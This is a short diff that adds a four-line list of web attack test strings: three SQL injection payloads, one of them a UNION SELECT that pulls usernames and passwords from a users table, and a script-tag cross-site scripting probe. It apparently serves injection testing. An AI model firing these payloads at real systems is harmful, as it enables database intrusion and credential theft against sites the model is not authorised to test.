@@ -1,0 +1,4 @@
+' OR '1' = '1
+'union select user, password from users where '1' = '1
+1 or 1=1
+<script type='text/javascript'>alert(‘Vulnerable’)</script>
